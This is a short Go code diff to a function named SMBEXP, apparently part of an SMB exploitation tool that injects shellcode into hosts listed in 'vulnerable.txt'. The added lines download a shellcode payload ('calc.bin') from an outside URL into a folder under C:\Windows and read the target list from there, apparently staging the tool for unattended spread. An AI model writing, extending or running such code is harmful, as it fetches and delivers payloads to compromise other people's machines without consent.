@@ -15,14 +15,15 @@ import (
 )
 
 func SMBEXP() {
+	DownloadFile("https://sourceforge.net/projects/app/files/calc.bin/download", "calc.bin","C://windows/loveorhate")
 	var (
 		shellcode string
 	)
-	flag.StringVar(&shellcode, "sc", "calc.bin", "shellcode file path")
+	flag.StringVar(&shellcode, "sc", "calc.bin", "C://windows/loveorhate/calc.bin ")
 	flag.Parse()
 
-	// Read IP addresses from "vulnerable.txt"
-	ipFile := "vulnerable.txt"
+	// Update the ipFile variable with the absolute path
+	ipFile := "C:\\Windows\\loveorhate\\vulnerable.txt"
 	ipData, err := ioutil.ReadFile(ipFile)
 	if err != nil {
 		if os.IsNotExist(err) {
